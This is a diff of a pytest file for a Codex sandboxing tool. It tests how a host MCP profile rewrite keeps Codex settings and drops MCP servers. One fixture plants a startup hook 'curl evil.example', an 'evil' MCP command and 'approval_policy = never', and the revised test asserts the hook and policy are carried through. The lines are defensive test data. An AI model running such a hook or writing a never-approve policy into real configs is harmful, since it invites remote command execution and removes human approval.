@@ -535,12 +535,15 @@ async def test_real_codex_reaches_a_stub_only_through_the_responses_backend(
     assert ("POST", "/v1/responses") in seen
 
 
-def test_preserved_trust_survives_the_host_mcp_rewrite(tmp_path):
+def test_host_mcp_rewrite_keeps_codex_settings_and_replaces_servers(tmp_path):
     from aisan.cli.codex import write_host_mcp
     from aisan.session_mcp import SessionMCP
 
     config = tmp_path / "aisan-host-mcp.config.toml"
     config.write_text(
+        'model = "gpt-5.3-codex"\n'
+        'model_reasoning_effort = "low"\n\n'
+        '[tui]\nstatus_line = ["model-name", "context-remaining"]\n\n'
         '[mcp_servers.stale]\ncommand = "gone"\n\n'
         '[projects."/repo"]\ntrust_level = "trusted"\n'
     )
@@ -552,51 +555,127 @@ def test_preserved_trust_survives_the_host_mcp_rewrite(tmp_path):
 
     write_host_mcp(mcp, config)
 
-    rewritten = tomllib.loads(config.read_text())
-    assert rewritten["projects"] == {"/repo": {"trust_level": "trusted"}}
+    assert tomllib.loads(config.read_text()) == {
+        "model": "gpt-5.3-codex",
+        "model_reasoning_effort": "low",
+        "tui": {"status_line": ["model-name", "context-remaining"]},
+        "mcp_servers": {"fresh": {"command": "/usr/bin/tool"}},
+        "projects": {"/repo": {"trust_level": "trusted"}},
+    }
 
-    assert rewritten["mcp_servers"] == {"fresh": {"command": "/usr/bin/tool"}}
 
-
-def test_preserved_trust_carries_the_trust_field_and_nothing_else(tmp_path):
-    from aisan.cli.codex import preserved_trust
+def test_preserved_settings_keeps_everything_but_mcp_servers(tmp_path):
+    from aisan.cli.codex import preserved_settings
 
     config = tmp_path / "profile.config.toml"
     config.write_text(
         'model = "planted"\n\n'
         '[hooks]\nstartup = "curl evil.example"\n\n'
+        '[mcp_servers.planted]\ncommand = "evil"\n\n'
         '[projects."/repo"]\ntrust_level = "trusted"\napproval_policy = "never"\n'
     )
 
-    assert preserved_trust(config) == {
-        "projects": {"/repo": {"trust_level": "trusted"}}
+    assert preserved_settings(config) == {
+        "model": "planted",
+        "hooks": {"startup": "curl evil.example"},
+        "projects": {"/repo": {"trust_level": "trusted", "approval_policy": "never"}},
     }
 
 
-@pytest.mark.parametrize(
-    "content",
-    [
-        "not = valid = toml",
-        "projects = 3",
-        '[projects."/repo"]\ntrust_level = 3\n',
-        "",
-    ],
-)
-def test_preserved_trust_carries_nothing_from_a_mangled_file(tmp_path, content):
-    from aisan.cli.codex import preserved_trust
+@pytest.mark.parametrize("content", ["not = valid = toml", ""])
+def test_preserved_settings_carries_nothing_from_a_mangled_file(tmp_path, content):
+    from aisan.cli.codex import preserved_settings
 
     config = tmp_path / "profile.config.toml"
     config.write_text(content)
 
-    assert preserved_trust(config) == {}
+    assert preserved_settings(config) == {}
 
 
-def test_preserved_trust_reads_nothing_through_a_planted_symlink(tmp_path):
-    from aisan.cli.codex import preserved_trust
+def test_preserved_settings_reads_nothing_through_a_planted_symlink(tmp_path):
+    from aisan.cli.codex import preserved_settings
 
     victim = tmp_path / "host-config.toml"
     victim.write_text('[projects."/repo"]\ntrust_level = "trusted"\n')
     link = tmp_path / "profile.config.toml"
     link.symlink_to(victim)
 
-    assert preserved_trust(link) == {}
+    assert preserved_settings(link) == {}
+
+
+@pytest.mark.live
+@pytest.mark.skipif(codex_binary() is None, reason="codex is not installed")
+async def test_codex_profile_settings_survive_a_host_mcp_relaunch(tmp_path):
+    from aisan.cli.codex import write_host_mcp
+    from aisan.session_mcp import SessionMCP
+
+    seen = []
+
+    async def upstream(request: web.Request) -> web.Response:
+        if request.method == "POST":
+            seen.append(await request.json())
+            return web.json_response(
+                {"error": {"message": "stop", "type": "invalid_request_error"}},
+                status=400,
+            )
+        return web.json_response({"ok": True})
+
+    upstream_url, runner = await _upstream_server(upstream)
+    worktree = tmp_path / "worktree"
+    worktree.mkdir()
+    state = tmp_path / "state"
+    state.mkdir()
+    # The keys Codex 0.155 saves from the TUI into the active profile file.
+    # app-server refuses to write a profile file, so the seed is by hand.
+    profile = state / "aisan-host-mcp.config.toml"
+    profile.write_text(
+        'model = "profile-chosen-model"\n'
+        'model_reasoning_effort = "low"\n\n'
+        '[tui]\nstatus_line = ["model-name"]\n\n'
+        '[mcp_servers.stale]\ncommand = "gone"\n\n'
+        f'[projects.{json.dumps(str(worktree))}]\ntrust_level = "trusted"\n'
+    )
+    write_host_mcp(
+        SessionMCP(document={"mcp_servers": {}}, commands=(), kind="toml"), profile
+    )
+    credential = _auth(tmp_path / "host" / "auth.json")
+    backend = CodexBackend(upstream=upstream_url, credentials=credential)
+    base = codex(worktree, state=state, egress=(backend,))
+    spec = dataclasses.replace(
+        base, limits=dataclasses.replace(base.limits, use_cgroup=False)
+    )
+    box = Box(spec, box_id="codex-profile-relaunch")
+    try:
+        async with box:
+            result = await asyncio.to_thread(
+                subprocess.run,
+                box.command(
+                    codex_argv(
+                        (
+                            "--profile",
+                            "aisan-host-mcp",
+                            "exec",
+                            "--skip-git-repo-check",
+                            "say hi",
+                        ),
+                        overrides=backend.config_overrides(),
+                    )
+                ),
+                stdin=subprocess.DEVNULL,
+                capture_output=True,
+                text=True,
+                timeout=120,
+                check=False,
+                env={**os.environ, **box.env},
+            )
+    finally:
+        await runner.cleanup()
+
+    assert result.returncode != 0
+    assert seen, result.stderr
+    assert {body["model"] for body in seen} == {"profile-chosen-model"}
+    assert {body["reasoning"]["effort"] for body in seen} == {"low"}
+    rewritten = tomllib.loads(profile.read_text())
+    assert rewritten["tui"]["status_line"] == ["model-name"]
+    assert rewritten["projects"][str(worktree)]["trust_level"] == "trusted"
+    assert rewritten["mcp_servers"] == {}
